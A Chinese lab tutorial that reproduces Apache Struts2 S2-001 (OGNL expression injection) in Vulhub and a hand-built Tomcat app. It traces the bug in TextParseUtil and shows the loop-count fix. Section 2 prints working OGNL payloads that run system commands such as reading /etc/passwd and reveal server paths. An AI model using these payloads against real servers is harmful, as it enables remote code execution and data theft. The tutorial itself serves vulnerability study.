# Vulhub漏洞系列：struts2漏洞 S2-001  

**本文章适合正在利用vulhub进行漏洞复现的朋友，或者准备学习漏洞复现的朋友，大佬就可以绕过了，写的比较基础。我也是一个小白，总结一下对于vulhub的使用技巧和一些漏洞原理，也分享一些自己觉得好用的方法给大家，欢迎大家帮我补充，有什么好用的技巧也可以分享一下，大家共同进步。本篇有自己的理解，如果有什么不对的或者不好的地方希望大家不要喷我，但是欢迎帮我指正。最后希望大家可以关注我的专栏。**

## 1.漏洞描述：

struts2漏洞
S2-001是当用户提交表单数据且验证失败时，服务器使用OGNL表达式解析用户先前提交的参数值，%{value}并重新填充相应的表单数据。例如，在注册或登录页面中。如果提交失败，则服务器通常默认情况下将返回先前提交的数据。由于服务器用于%{value}对提交的数据执行OGNL表达式解析，因此服务器可以直接发送有效载荷来执行命令。

## 2.vulhub漏洞利用：

用vulhub复现漏洞可以省去环境的搭建过程，相当方便。

vulhub官网地址：[https://vulhub.org](https://vulhub.org/)

![image.png](https://image.3001.net/images/20191227/1577429639_5e05aa874bf4f.png!small)![image.png](https://image.3001.net/images/20191227/1577429659_5e05aa9b7425a.png!small)  

启动漏洞环境。

    
    
    docker-compsoe up -d
    

输入测试的payload

    
    
    %{1+1}

![image.png](https://image.3001.net/images/20191227/1577429676_5e05aaacd083f.png!small)可以看到我们的加法表达式成功执行了。  

![image.png](https://image.3001.net/images/20191227/1577429698_5e05aac27e05e.png!small)

这次我们试一试命令执行，new java.lang.String[ {"cat","/etc/passwd"} 在这里更改我们想要执行的命令。

    
    
    %{#a=(new java.lang.ProcessBuilder(new java.lang.String[ {"cat","/etc/passwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(“com.opensymphony.xwork2.dispatcher.HttpServletResponse”),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}

![image.png](https://image.3001.net/images/20191227/1577429756_5e05aafc68c7e.png!small)成功的读取到了passwd文件。  

![image.png](https://image.3001.net/images/20191227/1577429796_5e05ab24e5c3c.png!small)  

下面给出三条利用语句：

获取tomcat路径  
---  
%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}  
  
获取web路径  
---  
%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}  
  
命令执行  
---  
%{#a=(new java.lang.ProcessBuilder(new
java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new
java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new
char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new
java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}  
  
  

## 3.搭建环境

平台：win10

工具：Apache Tomcat 9.0.7，IntelliJ IDEA

下载IntelliJ IDE之后我们选择免费试用一个月，接下来创建我们的项目。

![image.png](https://image.3001.net/images/20191227/1577429838_5e05ab4e55093.png!small)这个是搭建完成后的效果，下边所有创建添加的jar包或者修改的文件都按照这个格式进行。  

![image.png](https://image.3001.net/images/20191227/1577429877_5e05ab75d30ed.png!small)目录结构如下。  

![image.png](https://image.3001.net/images/20191227/1577429954_5e05abc2e7022.png!small)  

需要如下几个包，下载地址：

<http://archive.apache.org/dist/struts/binaries/struts-2.0.1-all.zip>

解压完之后，我们把lib目录下对应的jar包导入到我们在项目中创建的lib目录中。

![image.png](https://image.3001.net/images/20191227/1577429975_5e05abd7579d2.png!small)

![image.png](https://image.3001.net/images/20191227/1577429994_5e05abeab1c9f.png!small)

接着发布我们导入的jar包，不然会报错。

![image.png](https://image.3001.net/images/20191227/1577430019_5e05ac0354ae3.png!small)

接下来就是我们要创建的几个文件，这里代码都给出来了，直接copy就行。（注意：一定要按照前边给出的目录结构放置下边的文件）

web.xml

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    <web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://xmlns.jcp.org/xml/ns/javaee" xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd" id="WebApp_ID" version="3.1">
        <display-name>S2-001 Example</display-name>
        <filter>
            <filter-name>struts2</filter-name>
            <filter-class>org.apache.struts2.dispatcher.FilterDispatcher</filter-class>
        </filter>
        <filter-mapping>
            <filter-name>struts2</filter-name>
            <url-pattern>/*</url-pattern>
        </filter-mapping>
        <welcome-file-list>
            <welcome-file>index.jsp</welcome-file>
        </welcome-file-list>
    </web-app>

  

index.jsp

    
    
    <%@ page language="java" contentType="text/html; charset=UTF-8"
             pageEncoding="UTF-8"%>
    <%@ taglib prefix="s" uri="/struts-tags" %>
    <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
    <html>
    <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <title>S2-001</title>
    </head>
    <body>
    <h2>S2-001 Demo</h2>
    <p>link: <a href="https://cwiki.apache.org/confluence/display/WW/S2-001">https://cwiki.apache.org/confluence/display/WW/S2-001</a></p>
    <s:form action="login">
      <s:textfield name="username" label="username" />
      <s:textfield name="password" label="password" />
      <s:submit></s:submit>
    </s:form>
    </body>
    </html>  
    

  

welcome.jsp

    
    
    <%@ page language="java" contentType="text/html; charset=UTF-8"
             pageEncoding="UTF-8"%>
    <%@ taglib prefix="s" uri="/struts-tags" %>
    <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
    <html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>S2-001</title>
    </head>
    <body>
    <p>Hello <s:property value="username"></s:property></p>
    </body>
    </html>

LoginAction.java

    
    
    package com.demo.action;
    
    import com.opensymphony.xwork2.ActionSupport;
    
    public class LoginAction extends ActionSupport {
        private String username = null;
        private String password = null;
    
        public String getUsername() {
            return this.username;
        }
    
        public String getPassword() {
            return this.password;
        }
    
        public void setUsername(String username) {
            this.username = username;
        }
    
        public void setPassword(String password) {
            this.password = password;
        }
    
        public String execute() throws Exception {
            if ((this.username.isEmpty()) || (this.password.isEmpty())) {
                return "error";
            }
            if ((this.username.equalsIgnoreCase("admin"))
                    && (this.password.equals("admin"))) {
                return "success";
            }
            return "error";
        }
    }  
    

  

src目录下新建struts.xml

    
    
    <?xml version="1.0" encoding="UTF-8" ?>
    <!DOCTYPE struts PUBLIC
            "-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"
            "http://struts.apache.org/dtds/struts-2.0.dtd">
    <struts>
        <package name="S2-001" extends="struts-default">
            <action name="login" class="com.demo.action.LoginAction">
                <result name="success">welcome.jsp</result>
                <result name="error">index.jsp</result>
            </action>
        </package>
    </struts>  
    

## 4.原理分析

漏洞部分代码

xwork-2.0-beta-1.jar/com.opensymphony.xwork2/util/TextParseUtil.java

    
    
    public static Object translateVariables(char open, String expression, ValueStack stack, Class asType, TextParseUtil.ParsedValueEvaluator evaluator) {
        Object result = expression;
    
        while(true) {
            int start = expression.indexOf(open + "{");
            int length = expression.length();
            int x = start + 2;
            int count = 1;
    
            while(start != -1 && x < length && count != 0) {
                char c = expression.charAt(x++);
                if (c == '{') {
                    ++count;
                } else if (c == '}') {
                    --count;
                }
            }
    
            int end = x - 1;
            if (start == -1 || end == -1 || count != 0) {
                return XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);
            }
    
            String var = expression.substring(start + 2, end);
            Object o = stack.findValue(var, asType);
            if (evaluator != null) {
                o = evaluator.evaluate(o);
            }
    
            String left = expression.substring(0, start);
            String right = expression.substring(end + 1);
            if (o != null) {
                if (TextUtils.stringSet(left)) {
                    result = left + o;
                } else {
                    result = o;
                }
    
                if (TextUtils.stringSet(right)) {
                    result = result + right;
                }
    
                expression = left + o + right;
            } else {
                result = left + right;
                expression = left + right;
            }
        }
    }  
    

运行我们搭建好的环境，记得开启debug模式

![image.png](https://image.3001.net/images/20191227/1577430051_5e05ac23ba041.png!small)password处输入我们的测试语句：%{333*666},正确结果是多少来着，待我找个计算机算一下先（手动笑哭表情）

![image.png](https://image.3001.net/images/20191227/1577430070_5e05ac360e938.png!small)  

expression会获取不同的参数值，我们直到其获取到password开始分析漏洞原因。

![image.png](https://image.3001.net/images/20191227/1577430111_5e05ac5fcd2b4.png!small)![image.png](https://image.3001.net/images/20191227/1577430125_5e05ac6d21505.png!small)然后这次的判断跳过了中间的return，为啥会跳过return呢？因为这里的password内容任然是一个ognl表达式所以会再次进入循环，接着这里取出%{password}中间的值password赋给var。![image.png](https://image.3001.net/images/20191227/1577430144_5e05ac80c7068.png!small)在解析完%{password}表达式之后要获取其中的内容password进行展示，也就是我们这里的%{333*666}

![image.png](https://image.3001.net/images/20191227/1577430196_5e05acb48fddf.png!small)然后这次的判断同样也会跳过中间的return，为啥会跳过return呢？因为这里的password内容依然是一个ognl表达式所以会再次进入循环，接着这里取出%{333*666}中间的值333*666赋给var。

![image.png](https://image.3001.net/images/20191227/1577430219_5e05accb5b0f9.png!small)  

然后通过Object o = stack.findValue(var,
asType)获得到password的值为333*666，然后重新赋值给expression，进行下一次循环。

在这一次循环的时候，就会解析333*666，并将赋值给了o,经过计算后expression的值就变成了221788。

![image.png](https://image.3001.net/images/20191227/1577430241_5e05ace18dd99.png!small)不是OGNL表达式时就会进入  

![image.png](https://image.3001.net/images/20191227/1577430258_5e05acf24c540.png!small)![image.png](https://image.3001.net/images/20191227/1577430269_5e05acfdd51aa.png!small)  

## 5.漏洞修复

判断了循环的次数，从而在解析到%{333*666}的时候不会继续向下递归，相当于限制了解析ongl的次数。

![image.png](https://image.3001.net/images/20191227/1577430293_5e05ad157c6b2.png!small)  

也就不会对用户提交的参数进行ongl解析

    
    
    if (loopCount > maxLoopCount) {
        // translateVariables prevent infinite loop / expression recursive evaluation
        break;
    }

## 6.OGNL表达式

这里搬运大佬总结好的东西。

OGNL 是 Object-Graph Navigation Language 的缩写，它是一种功能强大的表达式语言（Expression
Language，简称为
EL），通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。
OGNL 三要素：(以下部分摘抄互联网某处, 我觉得说得好)

1、表达式（Expression）

表达式是整个 OGNL 的核心，所有的 OGNL 操作都是针对表达式的解析后进行的。表达式会规定此次 OGNL
操作到底要干什么。我们可以看到，在上面的测试中，name、department.name 等都是表达式，表示取 name 或者 department 中的
name 的值。OGNL 支持很多类型的表达式，之后我们会看到更多。

2、根对象（Root Object）

根对象可以理解为 OGNL 的操作对象。在表达式规定了 “干什么” 以后，你还需要指定到底“对谁干”。在上面的测试代码中，user
就是根对象。这就意味着，我们需要对 user 这个对象去取 name 这个属性的值（对 user 这个对象去设置其中的 department 中的 name
属性值）。

3、上下文环境（Context）

有了表达式和根对象，我们实际上已经可以使用 OGNL 的基本功能。例如，根据表达式对根对象进行取值或者设值工作。不过实际上，在 OGNL
的内部，所有的操作都会在一个特定的环境中运行，这个环境就是 OGNL
的上下文环境（Context）。说得再明白一些，就是这个上下文环境（Context），将规定 OGNL 的操作 “在哪里干”。  
OGN L 的上下文环境是一个 Map 结构，称之为 OgnlContext。上面我们提到的根对象（Root  
Object），事实上也会被加入到上下文环境中去，并且这将作为一个特殊的变量进行处理，具体就表现为针对根对象（Root  
Object）的存取操作的表达式是不需要增加 #符号进行区分的。

表达式功能操作清单：  
---  
1\. 基本对象树的访问  
对象树的访问就是通过使用点号将对象的引用串联起来进行。  
例如：xxxx，xxxx.xxxx，xxxx. xxxx. xxxx. xxxx. xxxx2. 对容器变量的访问  
对容器变量的访问，通过#符号加上表达式进行。  
例如：#xxxx，#xxxx. xxxx，#xxxx.xxxxx. xxxx. xxxx. xxxx3. 使用操作符号  
OGNL表达式中能使用的操作符基本跟Java里的操作符一样，除了能使用 +, -, *, /, ++, --, ==, !=, = 等操作符之外，还能使用
mod, in, not in等。4. 容器、数组、对象  
OGNL支持对数组和ArrayList等容器的顺序访问：例如：group.users[0]  
同时，OGNL支持对Map的按键值查找：  
例如：#session['mySessionPropKey']  
不仅如此，OGNL还支持容器的构造的表达式：  
例如：{"green", "red", "blue"}构造一个List，#{"key1" : "value1", "key2" : "value2",
"key3" : "value3"}构造一个Map  
你也可以通过任意类对象的构造函数进行对象新建  
例如：new Java.net.URL("xxxxxx/")5. 对静态方法或变量的访问  
要引用类的静态方法和字段，他们的表达方式是一样的@class@member或者@class@method(args)：6. 方法调用  
直接通过类似Java的方法调用方式进行，你甚至可以传递参数：  
例如：user.getName()，group.users.size()，group.containsUser(#requestUser)7. 投影和选择  
OGNL支持类似数据库中的投影（projection） 和选择（selection）。  
投影就是选出**中每个元素的相同属性组成新的**，类似于关系数据库的字段操作。投影操作语法为 collection.{XXX}，其中XXX
是这个**中每个元素的公共属性。  
例如：group.userList.{username}将获得某个group中的所有user的name的列表。  
选择就是过滤满足selection 条件的**元素，类似于关系数据库的纪录操作。选择操作的语法为：collection.{X YYY}，其中X
是一个选择操作符，后面则是选择用的逻辑表达式。而选择操作符有三种：  
? 选择满足条件的所有元素  
^ 选择满足条件的第一个元素  
$ 选择满足条件的最后一个元素  
例如：group.userList.{? #txxx.xxx != null}将获得某个group中user的name不为空的user的列表。  
  
 **  
**

 **参考文章**

<https://vulhub.org/#/environments/struts2/s2-001/>

[https://chybeta.github.io/2018/02/06/【struts2-命令-代码执行漏洞分析系列】S2-001/](https://chybeta.github.io/2018/02/06/%E3%80%90struts2-%E5%91%BD%E4%BB%A4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E3%80%91S2-001/)

<https://xz.aliyun.com/t/2672>

<https://juejin.im/post/5aa11445518825555f0c8aef>

  
  
  

  

  

